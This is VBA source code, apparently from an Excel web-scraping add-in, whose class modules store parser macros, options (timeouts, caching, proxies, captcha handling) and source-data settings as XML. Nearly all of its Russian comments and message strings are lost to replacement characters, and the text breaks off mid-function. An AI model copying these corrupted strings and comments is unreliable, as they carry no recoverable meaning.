            Set PD = New ParserDownload
            Set PD.Parent = Me
            PD.LoadFromXML subnode
            Items.Add PD
        Next
    End If
End Sub

Sub SaveFoldersInVariables()
    On Error Resume Next
    Dim PD As ParserDownload
    For Each PD In Me.Items
        ParserVariables.item("{d" & PD.Index & "folder}") = PD.GetDownloadFolderPath(False)
    Next PD
End Sub
Attribute VB_Name = "ParserMacro"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserMacro
' Author        : EducatedFool                     Date: 03.05.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Macro"
Public Parent As ParserMacros

Public Name As String
Public Index As Long
Public code As String

Private Sub Class_Terminate()
    Set Parent = Nothing
End Sub

Sub Run()
    On Error Resume Next

End Sub


Sub AddIntoWorkbook()
    On Error Resume Next

End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, macrocode$, j&
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name

            macrocode$ = ""
            For j = 1 To Len(code)
                macrocode$ = macrocode$ & IIf(Len(Hex(Asc(Mid(code, j, 1)))) = 1, "0", "") & Hex(Asc(Mid(code, j, 1)))
            Next j
            With .appendChild(XML.createElement("Code"))
                .text = macrocode$
            End With
        End With
    End With
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    Dim macrocode$, i&
    With node
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Name = .Attributes.getNamedItem("Name").text

        macrocode$ = .SelectSingleNode("Code").text
        If Len(macrocode$) Mod 2 = 0 Then
            code = ""
            For i = 1 To Len(macrocode$) / 2
                code = code & Chr(Val("&H" & Mid(macrocode$, 2 * i - 1, 2)))
            Next
        End If
    End With
End Sub


Attribute VB_Name = "ParserMacros"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserMacros
' Author        : EducatedFool                     Date: 08.02.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Macros", XML_SUBNODE_NAME$ = "Macro"
Public Parent As WebsiteParser

Public Items As New Collection

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set Items = Nothing
End Sub

Function GetItemByName(ByVal macroname$) As ParserMacro
    On Error Resume Next: Dim Macro As ParserMacro
    For Each Macro In Me.Items
        If Macro.Name = macroname$ Then Set GetItemByName = Macro: Exit Function
    Next Macro
End Function

Function GetItemByIndex(ByVal Index&) As ParserMacro
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function

Function DeleteItem(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
End Function

Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Function Add() As ParserMacro
    On Error Resume Next
    Set Add = New ParserMacro
    With Add
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add Add
End Function

Function ArrayOfNames() As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Me.Items.Count = 0 Then ArrayOfNames = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1)
    For i = 1 To Items.Count
        arr(i - 1) = Items(i).Name
    Next i
    ArrayOfNames = arr
End Function

Function ToArray() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&, rc&, r
    ReDim arr(0 To Items.Count - 1, 0 To 3)
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            arr(n, 0) = .Index
            arr(n, 1) = .Name

            rc = 0
            For Each r In Split(Replace(.code, vbNewLine, vbLf), vbLf)
                If Len(Trim(r)) Then rc = rc + 1
            Next
            arr(n, 2) = rc
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, Macro As ParserMacro
    Set XML = CreateObject("Microsoft.XMLDOM")

    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        'node.Attributes.setNamedItem(.createAttribute("Enabled")).Text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1

        For Each Macro In Me.Items
            node.appendChild Macro.ExportToXML
        Next Macro
    End With

    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If

        Dim subnode As IXMLDOMElement, Macro As ParserMacro
        Set Me.Items = New Collection

        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set Macro = New ParserMacro
            Set Macro.Parent = Me
            Macro.LoadFromXML subnode
            Set Macro.Parent = Me
            Me.Items.Add Macro
        Next
    End If
End Sub

Attribute VB_Name = "ParserOptions"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserOptions
' Author        : Igor Vakhnenko            Date: 28.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Options"
Public Parent As WebsiteParser

Public RequestTimeout As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Pause As Single        '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public UseCache As Long, UseFileCache As Boolean, AnotherCache As Boolean, AnotherCacheName As String
Public RemoveScripts As Boolean
Public RemoveIFrames As Boolean
Public RunParserFinishOnBreak As Boolean
Public ClearDictionaries As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public ShowErrors As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| balloon |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public InterruptOnError As Boolean        ' |fffd||fffd||fffd||fffd||fffd| MSGBOX |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd|
Public RetryCountOnError As Long    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Public NeedsOpenedWorkbook As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MSGBOX |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public ShowPrInd1 As Boolean, ShowPrInd2 As Boolean
Public UseClientCertificate As Boolean, ClientCertificateName As String

Public UseProxy As Boolean, ProxyList As String    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public CurrentProxyIndex As Long

Public CaptchaEnabled As Boolean
Public CaptchaDetectionText As String
Public CaptchaAttempts As Long
Public CaptchaHandler As String
Public CaptchaShowPopup As Boolean
Public CaptchaReloadPage As Boolean

Public Workbook_Filename As String
Public Workbook_Sheetname As String
Public Workbook_Open As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Workbook_Create As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public Workbook_Sheet As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public Workbook_Save As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public ResourceFileList As New Dictionary ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Initialize()
    Me.RequestTimeout = DEFAULT_QUERY_TIMEOUT&
    Me.UseCache = 1
    Me.UseFileCache = True
    Me.ShowPrInd1 = True
    Me.ShowPrInd2 = False
    Me.ShowErrors = True
    Me.RemoveScripts = False: Me.RemoveIFrames = False
    Me.RetryCountOnError = 1
    Me.CaptchaAttempts = 5
    Me.CaptchaShowPopup = True
    Me.CaptchaHandler = ACTION_SET_NAME_ONCAPTCHA$
    Me.CaptchaReloadPage = True
    Me.Workbook_Filename = "/files/{ParserName} {time=DD.MM.YYYY}.xlsx"
    Me.ClearDictionaries = True
End Sub

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set ResourceFileList = Nothing
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, res
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Version")).text = 1
            
            .appendChild(XML.createElement("RequestTimeout")).text = Me.RequestTimeout
            If Me.Pause > 0 Then .appendChild(XML.createElement("Pause")).text = Replace(Round(Me.Pause, 1), ",", ".")
            
            .appendChild(XML.createElement("UseCache")).text = IIf(Me.UseCache = 0, 0, 1)
            .appendChild(XML.createElement("UseFileCache")).text = Abs(CInt(Me.UseFileCache))
            If Me.AnotherCache Or (Me.AnotherCacheName <> "") Then
                With .appendChild(XML.createElement("AnotherCache"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.AnotherCache))
                    .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.AnotherCacheName
                End With
            End If
            
            .appendChild(XML.createElement("ShowPrInd1")).text = Abs(CInt(Me.ShowPrInd1))
            If Me.ShowPrInd2 Then .appendChild(XML.createElement("ShowPrInd2")).text = Abs(CInt(Me.ShowPrInd2))
            If Me.RemoveScripts Then .appendChild(XML.createElement("RemoveScripts")).text = Abs(CInt(Me.RemoveScripts))
            If Me.RemoveIFrames Then .appendChild(XML.createElement("RemoveIFrames")).text = Abs(CInt(Me.RemoveIFrames))
            If Me.RunParserFinishOnBreak Then .appendChild(XML.createElement("RunParserFinishOnBreak")).text = Abs(CInt(Me.RunParserFinishOnBreak))
            .appendChild(XML.createElement("ClearDictionaries")).text = Abs(CInt(Me.ClearDictionaries))
            
            If Me.UseClientCertificate Or (Me.ClientCertificateName <> "") Then
                With .appendChild(XML.createElement("ClientCertificate"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.UseClientCertificate))
                    .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.ClientCertificateName
                End With
            End If
            
            With .appendChild(XML.createElement("ErrorOptions"))
                .Attributes.setNamedItem(XML.createAttribute("Show")).text = Abs(CInt(Me.ShowErrors))
                .Attributes.setNamedItem(XML.createAttribute("Interrupt")).text = Abs(CInt(Me.InterruptOnError))
                .Attributes.setNamedItem(XML.createAttribute("RetryCount")).text = Me.RetryCountOnError
                .Attributes.setNamedItem(XML.createAttribute("NeedsOpenedWorkbook")).text = Abs(CInt(Me.NeedsOpenedWorkbook))
            End With
            
            With .appendChild(XML.createElement("Captcha"))
                .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.CaptchaEnabled))
                .Attributes.setNamedItem(XML.createAttribute("DetectionText")).text = Me.CaptchaDetectionText
                .Attributes.setNamedItem(XML.createAttribute("Attempts")).text = Me.CaptchaAttempts
                .Attributes.setNamedItem(XML.createAttribute("Handler")).text = Me.CaptchaHandler
                .Attributes.setNamedItem(XML.createAttribute("ShowPopup")).text = Abs(CInt(Me.CaptchaShowPopup))
                .Attributes.setNamedItem(XML.createAttribute("ReloadPage")).text = Abs(CInt(Me.CaptchaReloadPage))
            End With
            
            With .appendChild(XML.createElement("Workbook"))
                If Len(Me.Workbook_Filename) Then .Attributes.setNamedItem(XML.createAttribute("Filename")).text = Me.Workbook_Filename
                .Attributes.setNamedItem(XML.createAttribute("Open")).text = Abs(CInt(Me.Workbook_Open))
                .Attributes.setNamedItem(XML.createAttribute("Create")).text = Abs(CInt(Me.Workbook_Create))
                .Attributes.setNamedItem(XML.createAttribute("Save")).text = Abs(CInt(Me.Workbook_Save))
                .Attributes.setNamedItem(XML.createAttribute("Sheet")).text = Abs(CInt(Me.Workbook_Sheet))
                If Len(Me.Workbook_Sheetname) Then .Attributes.setNamedItem(XML.createAttribute("Sheetname")).text = Me.Workbook_Sheetname
            End With
            
            If Me.UseProxy Or (Me.ProxyList <> "") Then
                With .appendChild(XML.createElement("Proxy"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.UseProxy))
                    .Attributes.setNamedItem(XML.createAttribute("List")).text = Me.ProxyList
                End With
            End If
            
            If Me.ResourceFileList.Count Then
                With .appendChild(XML.createElement("Resources"))
                    For Each res In Me.ResourceFileList.Keys
                        .appendChild(XML.createElement("File")).text = res
                    Next res
                End With
            End If
        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If
    
    With node
        Me.RequestTimeout = Val(.SelectSingleNode("RequestTimeout").text)
        Me.Pause = Val(Replace(.SelectSingleNode("Pause").text, ",", "."))
        Me.UseCache = Val(.SelectSingleNode("UseCache").text)
        Me.UseFileCache = CBool(Val(.SelectSingleNode("UseFileCache").text))
        With .SelectSingleNode("AnotherCache")
            Me.AnotherCache = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.AnotherCacheName = Trim(.Attributes.getNamedItem("Name").text)
        End With
        
        Me.ShowPrInd1 = CBool(Val(.SelectSingleNode("ShowPrInd1").text))
        Me.ShowPrInd2 = CBool(Val(.SelectSingleNode("ShowPrInd2").text))
        Me.RemoveScripts = CBool(Val(.SelectSingleNode("RemoveScripts").text))
        Me.RemoveIFrames = CBool(Val(.SelectSingleNode("RemoveIFrames").text))
        Me.RunParserFinishOnBreak = CBool(Val(.SelectSingleNode("RunParserFinishOnBreak").text))
        Me.ClearDictionaries = CBool(Val(.SelectSingleNode("ClearDictionaries").text))
        
        With .SelectSingleNode("ErrorOptions")
            Me.ShowErrors = CBool(Val(.Attributes.getNamedItem("Show").text))
            Me.InterruptOnError = CBool(Val(.Attributes.getNamedItem("Interrupt").text))
            Me.RetryCountOnError = Val(.Attributes.getNamedItem("RetryCount").text)
            Me.NeedsOpenedWorkbook = CBool(Val(.Attributes.getNamedItem("NeedsOpenedWorkbook").text))
        End With
        
        With .SelectSingleNode("Captcha")
            Me.CaptchaEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.CaptchaDetectionText = .Attributes.getNamedItem("DetectionText").text
            Me.CaptchaAttempts = Val(.Attributes.getNamedItem("Attempts").text)
            Me.CaptchaHandler = .Attributes.getNamedItem("Handler").text
            Me.CaptchaShowPopup = CBool(Val(.Attributes.getNamedItem("ShowPopup").text))
            Me.CaptchaReloadPage = CBool(Val(.Attributes.getNamedItem("ReloadPage").text))
        End With
        
        With .SelectSingleNode("Workbook")
            Me.Workbook_Filename = .Attributes.getNamedItem("Filename").text
            Me.Workbook_Open = CBool(Val(.Attributes.getNamedItem("Open").text))
            Me.Workbook_Create = CBool(Val(.Attributes.getNamedItem("Create").text))
            Me.Workbook_Save = CBool(Val(.Attributes.getNamedItem("Save").text))
            Me.Workbook_Sheet = CBool(Val(.Attributes.getNamedItem("Sheet").text))
            Me.Workbook_Sheetname = .Attributes.getNamedItem("Sheetname").text
        End With
        
        With .SelectSingleNode("ClientCertificate")
            Me.UseClientCertificate = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.ClientCertificateName = Trim(.Attributes.getNamedItem("Name").text)
        End With
        
        With .SelectSingleNode("Proxy")
            Me.UseProxy = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.ProxyList = Trim(.Attributes.getNamedItem("List").text)
        End With
        
        With .SelectSingleNode("Resources")
            Dim subnode As IXMLDOMElement
            For Each subnode In .SelectNodes("File")
                If Len(Trim(subnode.text)) Then Me.ResourceFileList.Add CStr(Trim(subnode.text)), CStr(Trim(subnode.text))
            Next
        End With
        
    End With
End Sub


Attribute VB_Name = "ParserSourceData"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserSourceData
' Author        : Igor Vakhnenko            Date: 21.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "SourceData"
Public Parent As WebsiteParser

Public Enum PARSER_SOURCES
    ps_Unknown = 0
    ps_Column = 1
    ps_NumericRange = 2
    ps_FixedValue = 3
    ps_FoundColumn = 4
    ps_SheetRange = 5
End Enum

Public Actions As New ArrayActions

Public Mode As PARSER_SOURCES
Public Items As New Collection
Public ActiveItem As ParserSourceItem

Public SourceSheet As Worksheet
Public ColumnMode_Column As Long
Public ColumnMode_FirstRow As Long
Public ColumnMode_SelectedRowsOnly As Boolean
Public ColumnMode_UseCellText As Boolean

Public ColumnMode_CheckColumnEnabled As Boolean
Public ColumnMode_CheckColumnNumber As Long
Public ColumnMode_CheckColumnMask As String

Public NumRangeMode_MinValue As Long
Public NumRangeMode_MaxValue As Long
Public NumRangeMode_Step As Long
Public NumRangeMode_ExcludeValues As Boolean
Public NumRangeMode_ExcludeValuesColumn As Long

Public FixedValueMode_Value As String
Public FixedValueMode_SomeValues As Boolean

Public FoundColumnMode_Find_Text As String
Public FoundColumnMode_Find_Row As Long
Public FoundColumnMode_Find_ColumnOffset As Long
Public FoundColumnMode_FirstRow As Long
Public FoundColumnMode_SelectedRowsOnly As Boolean
Public FoundColumnMode_UseCellText As Boolean

Public FoundColumnMode_CheckColumnEnabled As Boolean
Public FoundColumnMode_CheckColumnOffset As Long
Public FoundColumnMode_CheckColumnMask As String


Public Enum SHEET_RANGE_MODE_FIND_TYPES
    ft_Value = 0
    ft_Hyperlink = 1
    ft_Comment = 2
End Enum

Public SheetRangeMode_Find_Text As String    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Public SheetRangeMode_Find_Type As SHEET_RANGE_MODE_FIND_TYPES    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (0=|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 1=URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 2=|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Public SheetRangeMode_SearchRange As String    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| ("selection" |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)

Public FOUND_COLUMN_NUMBER As Long

Private Sub Class_Initialize()
    Me.Mode = ps_FixedValue
    
    Me.ColumnMode_Column = 1: Me.ColumnMode_FirstRow = 2
    Me.ColumnMode_CheckColumnNumber = 1
    
    Me.FoundColumnMode_Find_Row = 1: Me.FoundColumnMode_Find_Text = "{ParserName}"
    Me.FoundColumnMode_Find_ColumnOffset = 0: Me.FoundColumnMode_FirstRow = 2: Me.FoundColumnMode_CheckColumnOffset = 0
    
    Me.SheetRangeMode_Find_Type = ft_Hyperlink: Me.SheetRangeMode_Find_Text = "*[/.]{ParserName}/?*"
    
    Me.NumRangeMode_MinValue = 1: Me.NumRangeMode_MaxValue = 50: Me.NumRangeMode_Step = 1: Me.NumRangeMode_ExcludeValuesColumn = 1
    
    Me.Actions.ActiveLevel = 1
End Sub

Function IsColumnMode() As Boolean
    IsColumnMode = (Me.Mode = ps_Column) Or (Me.Mode = ps_FoundColumn) Or (Me.Mode = ps_SheetRange)
End Function

Private Sub Class_Terminate()
    Set Actions = Nothing
    Set Items = Nothing
    Set ActiveItem = Nothing
    Set Parent = Nothing
    Set SourceSheet = Nothing
End Sub

Sub Execute()
    On Error Resume Next
    Dim i&, j&, arr, txt$, pi_caption$, ai_value$, value_forPI$, itemsCount&, piMsg$
    StopMainActions = 0
    itemsCount& = Me.Items.Count
    
    'Me.Parent.PrInd1.StartNewAction 1, , , , , Me.Items.Count
    Set MacroDestinationRange = Nothing
    
    If StopMacro < O Then GoTo exit_PSD_execute
    For i = 1 To Me.Items.Count
        Set Me.ActiveItem = Me.Items(i)
        value_forPI$ = ActiveItem.value
        If Len(value_forPI$) > 50 Then
            If value_forPI$ Like "http*" Then
                value_forPI$ = "..." & Right(value_forPI$, 50)
                If InStr(value_forPI$, "/") > 0 Then If InStr(value_forPI$, "/") < 15 Then value_forPI$ = "..." & Mid(value_forPI$, InStr(value_forPI$, "/"))
            Else
                value_forPI$ = Left(value_forPI$, 50) & "..."
            End If
        End If
        piMsg$ = "": If (Len(value_forPI$) > 0) Or (Me.Items.Count > 1) Then piMsg$ = tt("PI_Parser_SourceDataItem", i, itemsCount&, value_forPI$)
        Me.Parent.PrInd1.ShowLine 1, i, itemsCount&, piMsg$
        DoEvents
        
        If DESCRIPTION_MODE Then
            PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "table-source-data-actions", True
            PublishHTML_ShowCurrentValue "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", ActiveItem.value
        End If
        
        txt$ = ActiveItem.value
        ai_value$ = ActiveItem.value
        
        If ActiveItem.Parent.IsColumnMode Then Set MacroDestinationRange = ActiveItem.GetSourceRow
        
        Me.Parent.AASets.GetItemByName(ACTION_SET_NAME_BEFORE_SI$).Execute ai_value$
        If StopMacro Then GoTo exit_PSD_execute
        
        Me.Actions.ApplyTo txt$, ActiveItem
        If StopMacro Then GoTo exit_PSD_execute
        
        Me.Parent.AASets.GetItemByName(ACTION_SET_NAME_AFTER_SI$).Execute
        If StopMacro Then GoTo exit_PSD_execute
        
        '     If DESCRIPTION_MODE Then PublishHTML_CloseTable
        If DESCRIPTION_MODE Then GoTo exit_PSD_execute        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        DoEvents
    Next i
    Me.Parent.PrInd1.ShowLine 1, itemsCount& + 1, itemsCount&, "|fffd||fffd||fffd||fffd||fffd||fffd|"
    Exit Sub
    
exit_PSD_execute:
    Get_Data
    If SHOW_PI2 Then Me.Parent.PrInd2.Hide
    Me.Parent.PrInd1.Hide
    Set ActiveItem = Nothing
    Application.ScreenUpdating = True
End Sub

Function GetAllSourceRows() As Range
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
